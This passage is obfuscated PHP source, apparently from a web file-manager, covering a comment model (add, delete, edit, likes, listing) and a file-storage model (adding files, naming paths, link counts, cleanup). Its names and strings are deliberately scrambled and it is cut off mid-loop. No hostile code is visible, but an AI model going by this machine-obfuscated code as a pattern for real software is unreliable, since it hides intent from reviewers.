if ($D©¾ñÁŞÎÀ[$Bò¹‰¯ĞÛÇ[2099]]) { $BÒ’®ŒêÚ = $this->where(array($Bò¹‰¯ĞÛÇ[2100] => $D©¾ñÁŞÎÀ[$Bò¹‰¯ĞÛÇ[2099]]))->find(); if (!$BÒ’®ŒêÚ || $BÒ’®ŒêÚ[$Bò¹‰¯ĞÛÇ[368]] != $D©¾ñÁŞÎÀ[$Bò¹‰¯ĞÛÇ[368]] || $BÒ’®ŒêÚ[$Bò¹‰¯ĞÛÇ[452]] != $D©¾ñÁŞÎÀ[$Bò¹‰¯ĞÛÇ[452]]) { return !1; } $this->where(array($Bò¹‰¯ĞÛÇ[2100] => $D©¾ñÁŞÎÀ[$Bò¹‰¯ĞÛÇ[2099]]))->setAdd($Bò¹‰¯ĞÛÇ[2101], 1); } return $this->add($D©¾ñÁŞÎÀ); } public function remove($CĞ«Š˜ ªÍ) { $b‘çÏ¡–äƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D­ÜµÀö’ = array($b‘çÏ¡–äƒ[2100] => $CĞ«Š˜ ªÍ); $D ¥éêà‚å = $this->where($D­ÜµÀö’)->find(); if ($D ¥éêà‚å[$b‘çÏ¡–äƒ[2099]]) { $this->where(array($b‘çÏ¡–äƒ[2100] => $D ¥éêà‚å[$b‘çÏ¡–äƒ[2099]]))->setAdd($b‘çÏ¡–äƒ[2101], -1); } return $this->where($D­ÜµÀö’)->delete(); } public function edit($DÈˆŒ®‰, $cÕÒµ‹­„Ô) { $Bùµõ‚¦’½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¤‘¥š‡ß = array($Bùµõ‚¦’½[2100] => $DÈˆŒ®‰); return $this->where($e¤‘¥š‡ß)->save(array($Bùµõ‚¦’½[2102] => $cÕÒµ‹­„Ô)); } public function prasise($Aå‘ç¬œ‹) { $D¡ƒÊ…†‘µ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÕŸŸïƒ© = Model($D¡ƒÊ…†‘µ[2103]); $cœ›ëá²— = array($D¡ƒÊ…†‘µ[2100] => $Aå‘ç¬œ‹, $D¡ƒÊ…†‘µ[1400] => USER_ID); $fé–·óàİƒ = $EÕŸŸïƒ©->where($cœ›ëá²—)->find(); if (!$fé–·óàİƒ) { $EÕŸŸïƒ©->add($cœ›ëá²—); $bÑâÏ‘İÖ” = $this->where(array($D¡ƒÊ…†‘µ[2100] => $Aå‘ç¬œ‹))->setAdd($D¡ƒÊ…†‘µ[2104], 1); } else { $EÕŸŸïƒ©->where($cœ›ëá²—)->delete(); $bÑâÏ‘İÖ” = $this->where(array($D¡ƒÊ…†‘µ[2100] => $Aå‘ç¬œ‹))->setAdd($D¡ƒÊ…†‘µ[2104], -1); } return $bÑâÏ‘İÖ”; } public function targetInfo($a‹ä”˜—«—, $eÎ„¼Ä¶õ) { goto Bá™¦ÃùÔ¨; B±ÚÓÌÔƒ: return $d»ÒŸÚÉÁ; goto C»Ñ¶À‰‰Â; Bá™¦ÃùÔ¨: $A¢¬£õé© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AŒÃã‹âù = array($A¢¬£õé©[517] => $a‹ä”˜—«—, $A¢¬£õé©[518] => $eÎ„¼Ä¶õ); $CÙÅˆÚñŠ = $this->where($AŒÃã‹âù)->count(); goto eÑò£Œ; eÑò£Œ: $C‡‚¶ÎÑ¤ = "\x52\x49\107\x48\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\143\x6f\x6d\155\145\156\x74\137\x70\x72\x61\151\x73\x65\40\x73\x74\x61\x72\40\x6f\156\x20\143\157\x6d\x6d\145\156\164\x2e\143\x6f\155\155\x65\x6e\164\x49\x44\x20\75\40\163\x74\x61\162\56\x63\x6f\x6d\x6d\x65\x6e\164\111\104"; $DÍÁô–È‘’ = $this->alias($A¢¬£õé©[338])->where($AŒÃã‹âù)->join($C‡‚¶ÎÑ¤, $A¢¬£õé©[2105])->count(); $d»ÒŸÚÉÁ = array($A¢¬£õé©[2106] => $CÙÅˆÚñŠ, $A¢¬£õé©[2107] => $DÍÁô–È‘’); goto B±ÚÓÌÔƒ; C»Ñ¶À‰‰Â: } public function listData($bÈÅ©ø×™µ) { $EÍ“–‡”¦Ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2108]])) { if ($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2108]]) { $bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2109]] = array($EÍ“–‡”¦Ì[922], intval($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2108]])); } unset($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2108]]); } if (isset($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2110]])) { if ($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2110]]) { $bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2109]] = array($EÍ“–‡”¦Ì[919], intval($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2110]])); } unset($bÈÅ©ø×™µ[$EÍ“–‡”¦Ì[2110]]); } return $this->_listData($bÈÅ©ø×™µ); } private function _listData($EµŠİ¨†¼¯) { $B¢îÍ×ÙÇŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DŠé·È”Ù = $this->where($EµŠİ¨†¼¯)->_makeOrder()->selectPage(100); $this->_listAppendParent($DŠé·È”Ù[$B¢îÍ×ÙÇŒ[351]]); $this->_listAppendUser($DŠé·È”Ù[$B¢îÍ×ÙÇŒ[351]]); $this->_listAppendMeta($DŠé·È”Ù[$B¢îÍ×ÙÇŒ[351]]); return $DŠé·È”Ù; } private function _makeOrder() { $F¾ôñõŒ… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÑŒ³šœÜî = array($F¾ôñõŒ…[2104], $F¾ôñõŒ…[2101], $F¾ôñõŒ…[184]); $DáÑ¾£ºóš = Input::get($F¾ôñõŒ…[403], $F¾ôñõŒ…[7], $F¾ôñõŒ…[386], $bÑŒ³šœÜî); $bÉœµÔø‹¤ = Input::get($F¾ôñõŒ…[404], $F¾ôñõŒ…[7], $F¾ôñõŒ…[1402], array($F¾ôñõŒ…[2111], $F¾ôñõŒ…[401])); $A¥Ò–±×ÄÈ = $DáÑ¾£ºóš . $F¾ôñõŒ…[50] . $bÉœµÔø‹¤; return $this->order($A¥Ò–±×ÄÈ); } private function _listAppendParent(&$AÚ½‚¾ÔŸ¶) { goto F”¿…Õãî; dƒ…Ÿ¢ö†–: foreach ($AÚ½‚¾ÔŸ¶ as &$fÅ¡‰†³å) { if (isset($eã‰Ñ¡‘ã«[$fÅ¡‰†³å[$F‰õíÕÇ¥[2099]]])) { $fÅ¡‰†³å[$F‰õíÕÇ¥[2112]] = $eã‰Ñ¡‘ã«[$fÅ¡‰†³å[$F‰õíÕÇ¥[2099]]]; } } goto A“ºÖ©·£; F”¿…Õãî: $F‰õíÕÇ¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dšŠëİöˆÀ = array_unique(array_to_keyvalue($AÚ½‚¾ÔŸ¶, $F‰õíÕÇ¥[33], $F‰õíÕÇ¥[2099])); $dšŠëİöˆÀ = array_remove_value($dšŠëİöˆÀ, $F‰õíÕÇ¥[464]); goto c™æƒÛğò–; c™æƒÛğò–: if (!$dšŠëİöˆÀ) { return; } $eã‰Ñ¡‘ã« = $this->where(array($F‰õíÕÇ¥[2100] => array($F‰õíÕÇ¥[7], $dšŠëİöˆÀ)))->select(); $eã‰Ñ¡‘ã« = array_to_keyvalue($eã‰Ñ¡‘ã«, $F‰õíÕÇ¥[2109]); goto dƒ…Ÿ¢ö†–; A“ºÖ©·£: } private function _listAppendUser(&$b¡à÷£¦­æ) { goto A§ä§ˆ³„í; A§ä§ˆ³„í: $bíÜ¬¥ÅÔ¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÍ›äÆâÛ = array_unique(array_to_keyvalue($b¡à÷£¦­æ, $bíÜ¬¥ÅÔ¯[33], $bíÜ¬¥ÅÔ¯[1409])); $eÍ›äÆâÛ = array_remove_value($eÍ›äÆâÛ, $bíÜ¬¥ÅÔ¯[464]); goto A‹¸§Á÷Ò; bËŒç £è: foreach ($b¡à÷£¦­æ as &$Cî¡¹ŸÌÏÔ) { $Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[531]] = $e¢òïˆÓ ã[$Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[1409]]]; if (isset($Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[2112]])) { $Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[2112]][$bíÜ¬¥ÅÔ¯[531]] = $e¢òïˆÓ ã[$Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[2112]][$bíÜ¬¥ÅÔ¯[1409]]]; } } goto fîëÂĞäñá; A‹¸§Á÷Ò: if (count($eÍ›äÆâÛ) == 0) { return; } foreach ($b¡à÷£¦­æ as $Cî¡¹ŸÌÏÔ) { if (isset($Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[2112]])) { $eÍ›äÆâÛ[] = $Cî¡¹ŸÌÏÔ[$bíÜ¬¥ÅÔ¯[2112]][$bíÜ¬¥ÅÔ¯[1409]]; } } $e¢òïˆÓ ã = Model($bíÜ¬¥ÅÔ¯[473])->userListInfo($eÍ›äÆâÛ); goto bËŒç £è; fîëÂĞäñá: } private function _listAppendMeta(&$cØœ›ˆˆê§) { goto Cµåµ¼ß«õ; Cµåµ¼ß«õ: $fœÖ‹ÖŸÂ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cå»ÑÅ² = array_unique(array_to_keyvalue($cØœ›ˆˆê§, $fœÖ‹ÖŸÂ[33], $fœÖ‹ÖŸÂ[2109])); $cå»ÑÅ² = array_remove_value($cå»ÑÅ², $fœÖ‹ÖŸÂ[464]); goto b©Ì¬®ÁÖÀ; c²¢Íæ¤µÊ: if (!$f³ßæ·ÎòÉ) { return !1; } foreach ($cØœ›ˆˆê§ as &$bÓÚçµöÇŒ) { $bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[413]] = $f³ßæ·ÎòÉ[$bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2109]]]; if (isset($bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2112]])) { $bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2112]][$fœÖ‹ÖŸÂ[413]] = $f³ßæ·ÎòÉ[$bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2112]][$fœÖ‹ÖŸÂ[2109]]]; } } goto eìÙƒ‡Õµë; b©Ì¬®ÁÖÀ: if (!$cå»ÑÅ²) { return; } foreach ($cØœ›ˆˆê§ as $bÓÚçµöÇŒ) { if (isset($bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2112]])) { $cå»ÑÅ²[] = $bÓÚçµöÇŒ[$fœÖ‹ÖŸÂ[2112]][$fœÖ‹ÖŸÂ[2109]]; } } $f³ßæ·ÎòÉ = $this->metaList($cå»ÑÅ²); goto c²¢Íæ¤µÊ; eìÙƒ‡Õµë: } private function metaList($d•ãîÙ˜¾ç) { goto dšùñóÀñ; dšùñóÀñ: $a¦ÏÕ­÷™¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$d•ãîÙ˜¾ç) { return array(); } $F¼©°®³’¯ = array($a¦ÏÕ­÷™¹[2109] => array($a¦ÏÕ­÷™¹[7], $d•ãîÙ˜¾ç)); goto A²ª¤Òˆ; A²ª¤Òˆ: $bïÚŠ…Ë˜· = Model($a¦ÏÕ­÷™¹[2113])->where($F¼©°®³’¯)->select(); $bïÚŠ…Ë˜· = array_to_keyvalue_group($bïÚŠ…Ë˜·, $a¦ÏÕ­÷™¹[2109]); foreach ($bïÚŠ…Ë˜· as $aÏñ¾×Ë¾ => $BÄ‘¯Â¥¦Ë) { $Eİ‘£¯¹¥ = array(); foreach ($BÄ‘¯Â¥¦Ë as $D¯Ø¦ÃõëÇ) { $Eİ‘£¯¹¥[$D¯Ø¦ÃõëÇ[$a¦ÏÕ­÷™¹[89]]] = $D¯Ø¦ÃõëÇ[$a¦ÏÕ­÷™¹[356]]; } $bïÚŠ…Ë˜·[$aÏñ¾×Ë¾] = $Eİ‘£¯¹¥; } goto dëÍõÀä÷; dëÍõÀä÷: return $bïÚŠ…Ë˜· ? $bïÚŠ…Ë˜· : array(); goto Fˆ°—é™Â«; Fˆ°—é™Â«: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\145"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\145" => "\x69\157\x5f\x66\151\x6c\x65\137\x6d\145\x74\141", "\x6d\145\164\x61\x46\151\x65\x6c\x64" => "\146\151\x6c\x65\x49\104"); public function fileInfo($aø÷Ğ»†—ğ) { $EŸ÷§¶òŞñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $dŠä†ñÆù = array(); if (!isset($dŠä†ñÆù[$aø÷Ğ»†—ğ])) { $E“¤ ªÚäÔ = $EŸ÷§¶òŞñ[2114]; $F‡Óåø›ã… = Model($EŸ÷§¶òŞñ[418])->field($E“¤ ªÚäÔ)->where(array($EŸ÷§¶òŞñ[416] => $aø÷Ğ»†—ğ))->find(); $dŠä†ñÆù[$aø÷Ğ»†—ğ] = $F‡Óåø›ã…; } return $dŠä†ñÆù[$aø÷Ğ»†—ğ]; } public function addFileByContent($CÅ¦ƒÔ‘ŠÇ = '', $eÊ‹Ã¦×±ğ = '') { goto CÏí¾È½Î; CÏí¾È½Î: $EŞñŒ¹ÆÖƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c™ªÏ×Ì«Æ = TEMP_PATH . $EŞñŒ¹ÆÖƒ[2115]; if (!is_dir($c™ªÏ×Ì«Æ)) { mk_dir($c™ªÏ×Ì«Æ); } goto Eô‰«Ë‘Ã; Eô‰«Ë‘Ã: $cëâŒâã¡” = $c™ªÏ×Ì«Æ . $EŞñŒ¹ÆÖƒ[2116] . rand_string(16); file_put_contents($cëâŒâã¡”, $CÅ¦ƒÔ‘ŠÇ); $F„¢‚¾ºº™ = $this->addFile($cëâŒâã¡”, $eÊ‹Ã¦×±ğ, !0); goto c™…‹ƒ±İÔ; c™…‹ƒ±İÔ: if (file_exists($cëâŒâã¡”)) { @unlink($cëâŒâã¡”); } return $F„¢‚¾ºº™; goto dçœŠÂ‘æ; dçœŠÂ‘æ: } public function createFileName($bºÚ¸‰áÓ) { goto fè“Äèé¦÷; fè“Äèé¦÷: $BÍà³…¾°¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bñš“êÖ„İ = IO::init($BÍà³…¾°¤[8]); $cã§™²¾‡ = $this->makeFilePath($bºÚ¸‰áÓ, $Bñš“êÖ„İ); goto bğÎ‰‹´‹Ô; bğÎ‰‹´‹Ô: $dãï×ò²ìĞ = $Bñš“êÖ„İ->pathFather($cã§™²¾‡); static $D™³ÉçÎ‘ƒ = false; $EÅË Ö£±â = $BÍà³…¾°¤[2117] . md5($dãï×ò²ìĞ); goto D”‚—èƒõ£; D”‚—èƒõ£: if (!$D™³ÉçÎ‘ƒ && !Cache::get($EÅË Ö£±â)) { $D™³ÉçÎ‘ƒ = !0; $b‡Øğğğ“ = IO::mkdir($dãï×ò²ìĞ); if (!IO::exist($b‡Øğğğ“ . $BÍà³…¾°¤[2118])) { IO::mkfile($b‡Øğğğ“ . $BÍà³…¾°¤[2118]); } Cache::set($EÅË Ö£±â, 1, 3600 * 2); } return $cã§™²¾‡; goto cµù˜±…È¼; cµù˜±…È¼: } public function makeFilePath($c±ë–‚šŠ‹, $E²˜»º«º‘) { goto C¡Şë˜—Ä; bİô›—­Ø: $d—–ïÁÅ›Ë = $dƒîÔÛñê . rand_string(5) . short_id(100); $c±ë–‚šŠ‹ = str_replace($b ÆÇŒôŒÕ[8], $b ÆÇŒôŒÕ[70], KodIO::clear($c±ë–‚šŠ‹)); if (!$c±ë–‚šŠ‹) { $E³Èõ•¯†± = $b ÆÇŒôŒÕ[2121]; } goto eÔ—¬ßĞ¶; C¡Şë˜—Ä: $b ÆÇŒôŒÕ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E³Èõ•¯†± = Model($b ÆÇŒôŒÕ[1080])->get($b ÆÇŒôŒÕ[2119]); $dƒîÔÛñê = KodIO::defaultIO() . date($b ÆÇŒôŒÕ[2120]); goto bİô›—­Ø; eÔ—¬ßĞ¶: switch ($E³Èõ•¯†±) { case $b ÆÇŒôŒÕ[2122]: $d—–ïÁÅ›Ë = $d—–ïÁÅ›Ë . $b ÆÇŒôŒÕ[93] . $E²˜»º«º‘->ext($c±ë–‚šŠ‹); if ($E²˜»º«º‘->ext($c±ë–‚šŠ‹) == $b ÆÇŒôŒÕ[2062]) { $d—–ïÁÅ›Ë .= $b ÆÇŒôŒÕ[2123]; } break; case $b ÆÇŒôŒÕ[2124]: goto FªÇçŠğÍØ; f¼Ü¯£Şïğ: if ($E²˜»º«º‘->ext($c±ë–‚šŠ‹) == $b ÆÇŒôŒÕ[2062]) { $c±ë–‚šŠ‹ .= $b ÆÇŒôŒÕ[2123]; } $FÆ™¤Ë¯Œ = IO::fileNameAuto($dƒîÔÛñê, $c±ë–‚šŠ‹); $d—–ïÁÅ›Ë = $dƒîÔÛñê . $FÆ™¤Ë¯Œ; goto fíé¢»ÓÄ; fíé¢»ÓÄ: break; goto AğáğÚ‡ø¹; FªÇçŠğÍØ: $E˜¼¸†â‰³ = Model($b ÆÇŒôŒÕ[1080])->get($b ÆÇŒôŒÕ[1309]); $eğº í³ô = substr(md5($b ÆÇŒôŒÕ[1882] . $E˜¼¸†â‰³ . date($b ÆÇŒôŒÕ[682])), 0, 8); $dƒîÔÛñê = KodIO::defaultIO() . date($b ÆÇŒôŒÕ[2125]) . $eğº í³ô . $b ÆÇŒôŒÕ[8]; goto f¼Ü¯£Şïğ; AğáğÚ‡ø¹: case $b ÆÇŒôŒÕ[2121]: break; default: break; } return $d—–ïÁÅ›Ë; goto Cî¸È½˜©›; Cî¸È½˜©›: } public function addFileByRemote($FîÅùˆîÊ, $A·’¿Äéä, $F­‡óİ² = array()) { goto cª…²Ì˜Š ; C¬©Ã‡å‚’: if ($D¯Âóà‰—É = $this->addFileCheckExist($eù‚™š…é³[$Dš›ö‹¼ÈÎ[161]], $eù‚™š…é³[$Dš›ö‹¼ÈÎ[160]], $eù‚™š…é³[$Dš›ö‹¼ÈÎ[77]])) { return $D¯Âóà‰—É; } return $this->addFileData($eù‚™š…é³); goto c…‰ÓŞÁáÁ; cª…²Ì˜Š : $Dš›ö‹¼ÈÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!IO::exist($FîÅùˆîÊ)) { return !1; } $c“İ¸å¬Îê = $F­‡óİ²[$Dš›ö‹¼ÈÎ[160]] ? $F­‡óİ²[$Dš›ö‹¼ÈÎ[160]] : $Dš›ö‹¼ÈÎ[33]; goto f¶Ü‚ÓÒŞ; f¶Ü‚ÓÒŞ: $eëµ²Şğ‘Ö = IO::hashMd5($FîÅùˆîÊ, $c“İ¸å¬Îê); $Dó„êæ“Æ¶ = KodIO::defaultDriver(); $eù‚™š…é³ = array($Dš›ö‹¼ÈÎ[516] => IO::size($FîÅùˆîÊ), $Dš›ö‹¼ÈÎ[2126] => 1, $Dš›ö‹¼ÈÎ[383] => $A·’¿Äéä, $Dš›ö‹¼ÈÎ[730] => $Dó„êæ“Æ¶[$Dš›ö‹¼ÈÎ[364]], $Dš›ö‹¼ÈÎ[384] => $FîÅùˆîÊ, $Dš›ö‹¼ÈÎ[2127] => $F­‡óİ²[$Dš›ö‹¼ÈÎ[161]] ? $F­‡óİ²[$Dš›ö‹¼ÈÎ[161]] : IO::hashSimple($FîÅùˆîÊ), $Dš›ö‹¼ÈÎ[2128] => $eëµ²Şğ‘Ö ? $eëµ²Şğ‘Ö : $c“İ¸å¬Îê); goto C¬©Ã‡å‚’; c…‰ÓŞÁáÁ: } private function addFileData($còšÛ›Ê ¢) { $bñÙÅäËÖç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$còšÛ›Ê ¢) { return !1; } $còšÛ›Ê ¢[$bñÙÅäËÖç[77]] = intval($còšÛ›Ê ¢[$bñÙÅäËÖç[77]]); if (!$còšÛ›Ê ¢[$bñÙÅäËÖç[77]] && strlen($còšÛ›Ê ¢[$bñÙÅäËÖç[161]]) > 32) { $còšÛ›Ê ¢[$bñÙÅäËÖç[77]] = intval(substr($còšÛ›Ê ¢[$bñÙÅäËÖç[161]], 32)); } $Cá½‘Şáƒ¦ = $this->add($còšÛ›Ê ¢); return $this->find($Cá½‘Şáƒ¦); } public function addFile($dË» ¦•º·, $EÍ‰ƒö´õ§, $aƒÇÉ¬¸íì = false) { $få‹èƒŠêÕ = IO::hashSimple($dË» ¦•º·); $B‚ÜÚõÊ©Ş = IO::hashMd5($dË» ¦•º·); $C¨ëˆƒÑÎ = IO::size($dË» ¦•º·); if ($EÂ÷ò…Šƒ… = $this->addFileCheckExist($få‹èƒŠêÕ, $B‚ÜÚõÊ©Ş, $C¨ëˆƒÑÎ)) { return $EÂ÷ò…Šƒ…; } $c´ùùÀŞ²† = $this->addFileMake($dË» ¦•º·, $C¨ëˆƒÑÎ, $få‹èƒŠêÕ, $B‚ÜÚõÊ©Ş, $EÍ‰ƒö´õ§, $aƒÇÉ¬¸íì); return $this->addFileData($c´ùùÀŞ²†); } public function addFileMake($C¤Ó‰Ü—Üë, $cø•öÇœö , $FÍíˆÓ Æ–, $BÌœÙ¨£Ñ„, $E›Ú”©ß×Ö, $d³¦ÍÍ“æ¾) { goto A£¸¿Áê°Ó; A£¸¿Áê°Ó: $dì›µêÎˆæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÛìÔŞã·¶ = $this->createFileName($E›Ú”©ß×Ö); $F²öæÁ¹ = get_path_father($BÛìÔŞã·¶); goto B‹‡‹„Ôå–; BÔØ®âÈÁš: $B·‰”ã‰Œ¹ = KodIO::defaultDriver(); $Eø¼â³›¿Ş = array($dì›µêÎˆæ[516] => $cø•öÇœö , $dì›µêÎˆæ[2126] => 1, $dì›µêÎˆæ[383] => $E›Ú”©ß×Ö, $dì›µêÎˆæ[730] => $B·‰”ã‰Œ¹[$dì›µêÎˆæ[364]], $dì›µêÎˆæ[384] => $BÛìÔŞã·¶, $dì›µêÎˆæ[2127] => $FÍíˆÓ Æ–, $dì›µêÎˆæ[2128] => $BÌœÙ¨£Ñ„); return $Eø¼â³›¿Ş; goto E‰æŞÀêÄÄ; B‹‡‹„Ôå–: $cÍÂí£®Â = get_path_this($BÛìÔŞã·¶); if ($d³¦ÍÍ“æ¾) { $d¡ŞØ÷Û„Í = IO::move($C¤Ó‰Ü—Üë, $F²öæÁ¹, !1, $cÍÂí£®Â); } else { $d¡ŞØ÷Û„Í = IO::copy($C¤Ó‰Ü—Üë, $F²öæÁ¹, !1, $cÍÂí£®Â); } if (!$d¡ŞØ÷Û„Í) { return !1; } goto BÔØ®âÈÁš; E‰æŞÀêÄÄ: } public function addFileCheckExist($DÖ³ñ‚ôÏ’, $déÊá¢ÈËÚ, $aéÈ„ï…‡) { $E¹ÒùğÍåœ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aòó›Äµã‚ = $this->findByHash($DÖ³ñ‚ôÏ’, $déÊá¢ÈËÚ); if (!$aòó›Äµã‚) { return !1; } $Eì¬ŠíÚ³¤ = array($E¹ÒùğÍåœ[2126] => intval($aòó›Äµã‚[$E¹ÒùğÍåœ[2129]]) + 1, $E¹ÒùğÍåœ[516] => $aéÈ„ï…‡); $this->where(array($E¹ÒùğÍåœ[416] => $aòó›Äµã‚[$E¹ÒùğÍåœ[415]]))->save($Eì¬ŠíÚ³¤); return $aòó›Äµã‚; } public function remove($eÌó¡ÅÉä©) { $this->linkCountChange($eÌó¡ÅÉä©, !1); $this->clearEmpty(); return !0; } public function linkAdd($FôƒŞ‡·Ú) { $this->linkCountChange($FôƒŞ‡·Ú, !0); } public function linkCountChange($A‹¼÷”­Ø, $dµ‡©ëø³Š) { goto Bó³ÑÉÓ®; bœ¦Æ“—œ•: $AŠëîß•’Ô = array(); foreach ($A‹¼÷”­Ø as $fë‡ªŞ¬¥Ñ) { $f·È•»ÑÑ‚ = $fë‡ªŞ¬¥Ñ . $d„Ê†¹ô˜„[33]; if (!$AŠëîß•’Ô[$f·È•»ÑÑ‚]) { $AŠëîß•’Ô[$f·È•»ÑÑ‚] = 0; } $AŠëîß•’Ô[$f·È•»ÑÑ‚]++; } $eªğÂÇ‡²Å = array(); goto FË±ÚŸù‡; FË±ÚŸù‡: foreach ($AŠëîß•’Ô as $fë‡ªŞ¬¥Ñ => $bŒØ¤«›÷) { $f·È•»ÑÑ‚ = $bŒØ¤«›÷ . $d„Ê†¹ô˜„[33]; if (!$eªğÂÇ‡²Å[$f·È•»ÑÑ‚]) { $eªğÂÇ‡²Å[$f·È•»ÑÑ‚] = array(); } $eªğÂÇ‡²Å[$f·È•»ÑÑ‚][] = $fë‡ªŞ¬¥Ñ; } foreach ($eªğÂÇ‡²Å as $bŒØ¤«›÷ => $bÔ²™„ÒÈ) { if (!$bÔ²™„ÒÈ) { continue; } $bŒØ¤«›÷ = $dµ‡©ëø³Š ? $bŒØ¤«›÷ : -intval($bŒØ¤«›÷); $a‹Ş¼†³†Û = array($d„Ê†¹ô˜„[415] => array($d„Ê†¹ô˜„[7], $bÔ²™„ÒÈ)); if ($bŒØ¤«›÷ < 0) { $a‹Ş¼†³†Û[$d„Ê†¹ô˜„[2129]] = array($d„Ê†¹ô˜„[923], abs($bŒØ¤«›÷)); } $this->where($a‹Ş¼†³†Û)->setAdd($d„Ê†¹ô˜„[2129], $bŒØ¤«›÷); } goto aáô„–æâ; Bó³ÑÉÓ®: $d„Ê†¹ô˜„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$A‹¼÷”­Ø) { return; } if (!is_array($A‹¼÷”­Ø)) { $A‹¼÷”­Ø = array($A‹¼÷”­Ø); } goto bœ¦Æ“—œ•; aáô„–æâ: } public function findByHash($F’×…†îµä, $aá¢±ğ»‰ó = false) { $CÃçÌ¾·Ö± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F’×…†îµä && !$aá¢±ğ»‰ó) { return !1; } $c…æãè¢ÂÑ = array($CÃçÌ¾·Ö±[2127] => $F’×…†îµä); if ($aá¢±ğ»‰ó) { $c…æãè¢ÂÑ = array($CÃçÌ¾·Ö±[2128] => $aá¢±ğ»‰ó); } return $this->order($CÃçÌ¾·Ö±[2130])->where($c…æãè¢ÂÑ)->find(); } public function clearEmpty($BŠ°êæ¿áÄ = 0) { goto cÚİ„İó‘ñ; A…³Ææ¢È: foreach ($a¤Èˆ…øİ as $eËÙ«½î¼) { $a†íÒŸèÇ˜->update(1); $this->resetFile($eËÙ«½î¼); } $a†íÒŸèÇ˜->end(); goto e”Ù‚ÛŒ¨—; cÚİ„İó‘ñ: $CÇ¶é‘–‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‹ˆ„‹–¶¯ = time() - 3600 * 24 * $BŠ°êæ¿áÄ; $eµ˜»âÙóÅ = $CÇ¶é‘–‹[2131] . $d‹ˆ„‹–¶¯; goto A£ö°­ÒÚ¢; A£ö°­ÒÚ¢: $a¤Èˆ…øİ = $this->where($eµ˜»âÙóÅ)->select(); if (!$a¤Èˆ…øİ) { return; } $a†íÒŸèÇ˜ = new Task($CÇ¶é‘–‹[2132], $CÇ¶é‘–‹[33], count($a¤Èˆ…øİ)); goto A…³Ææ¢È; e”Ù‚ÛŒ¨—: } private function resetFile($eƒÇÏ‡¯¢š) { goto fËƒ‚‚¾ø“; fËƒ‚‚¾ø“: $BÉÜ«£®ÕŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CêÜÅ¡—« = array($BÉÜ«£®ÕŒ[416] => $eƒÇÏ‡¯¢š[$BÉÜ«£®ÕŒ[415]]); $Cï¨äëÕ¯ = Model($BÉÜ«£®ÕŒ[1102])->where($CêÜÅ¡—«)->count(); goto bÄª‰‚Î÷Ë; bÄª‰‚Î÷Ë: $dÖ·˜•§„ô = Model($BÉÜ«£®ÕŒ[2133])->where($CêÜÅ¡—«)->count(); $fÃ«ëëëÙ = intval($Cï¨äëÕ¯) + intval($dÖ·˜•§„ô); if ($fÃ«ëëëÙ == 0) { IO::remove($eƒÇÏ‡¯¢š[$BÉÜ«£®ÕŒ[75]]); $this->where($CêÜÅ¡—«)->delete(); $this->metaSet($eƒÇÏ‡¯¢š[$BÉÜ«£®ÕŒ[415]], null, null); return; } goto còäÙñ¾²Ç; còäÙñ¾²Ç: if ($eƒÇÏ‡¯¢š[$BÉÜ«£®ÕŒ[2129]] != $fÃ«ëëëÙ) { $this->where($CêÜÅ¡—«)->save(array($BÉÜ«£®ÕŒ[2126] => $fÃ«ëëëÙ)); } goto f…•š™¯õá; f…•š™¯õá: } public function storageInfo($eïÛôĞöÈí = false) { goto b„å¡¹‘¦Š; b„å¡¹‘¦Š: $d³¹ØŠ®‘© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÉˆø‹Ğ†¶ = $this->count() + 0.0; $a¤ß¨±È¾¢ = 0; goto DÂİµ¿åËØ; DÂİµ¿åËØ: $eã‡ãØˆŒ = 1; $C¡İÈ§õå = 0; $cÜŞ¨»£±½ = 5000; goto Fœ¬ò¿ƒÙİ; Fœ¬ò¿ƒÙİ: for ($f«­ÍÅÃŒ÷ = 0; 